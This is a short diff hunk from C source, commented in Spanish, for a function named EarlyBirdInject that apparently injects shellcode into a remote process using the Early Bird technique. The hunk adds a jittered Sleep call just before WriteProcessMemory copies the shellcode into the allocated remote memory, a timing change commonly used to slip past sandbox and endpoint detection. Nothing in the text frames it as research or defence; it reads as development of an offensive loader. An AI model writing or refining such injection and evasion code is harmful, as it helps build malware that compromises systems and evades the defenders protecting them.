@@ -3389,7 +3389,7 @@ BOOL EarlyBirdInject(unsigned char* shellcode, int shellcode_len) {
     }
     printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
     fflush(stdout);
-
+    Sleep(GetJitteredSleep(SLEEP_BASE));
     // 🔹 WriteProcessMemory (API normal, más estable que NtWriteVirtualMemory syscall)
     if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
         printf("[-] WriteProcessMemory falló: %lu\n", GetLastError());
